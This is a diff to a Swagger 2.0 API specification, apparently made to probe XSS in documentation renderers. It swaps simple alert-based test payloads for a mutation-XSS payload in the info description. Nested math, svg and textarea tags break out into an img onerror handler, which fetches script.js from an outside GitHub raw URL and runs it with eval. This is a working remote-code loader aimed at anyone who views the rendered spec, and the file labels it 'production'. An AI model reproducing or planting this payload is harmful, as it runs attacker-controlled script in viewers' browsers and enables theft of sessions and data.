@@ -1,23 +1,5 @@
 swagger: '2.0'
 info:
-  title: XSS Test
-  description: |
-    <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea>
-    <a title='</textarea><img src=x onerror=alert("Hello")>'></textarea>
-    </h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph>
-    </option></mtext></math>
-  version: 1.0.0
-paths:
-  /test:
-    get:
-      parameters:
-        - name: payload
-          in: query
-          description: |
-            <script>alert(1)</script>
-            <img src=x onerror=alert("XSS")>
-          type: string
-      responses:
-        '200':
-          description: |
-            <svg/onload=alert("Hello")>
+  title: XSS test Ravi
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/ravi5hanka/swagger-yaml/refs/heads/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  version: production
